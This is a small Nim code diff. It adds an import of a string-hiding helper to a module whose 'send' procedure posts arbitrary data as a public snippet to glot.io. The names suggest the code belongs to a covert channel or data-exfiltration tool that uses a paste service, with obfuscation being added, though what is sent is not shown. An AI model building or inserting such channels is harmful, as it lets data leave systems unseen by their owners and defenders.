@@ -1,5 +1,7 @@
 import httpclient
 
+import ../functions/hideString
+
 from os import sleep
 
 from ../channels import sendThreadChannel
@@ -13,7 +15,7 @@ proc send(data: string): void =
   let body: string = "{\"public\": true,\"files\": [{\"content\": \"" & data & "\"}]}"
 
   let response = client.request(
-    "https://snippets.glot.io/snippets",
+     "https://snippets.glot.io/snippets",
     httpMethod = HttpPost,
     body = body
   )
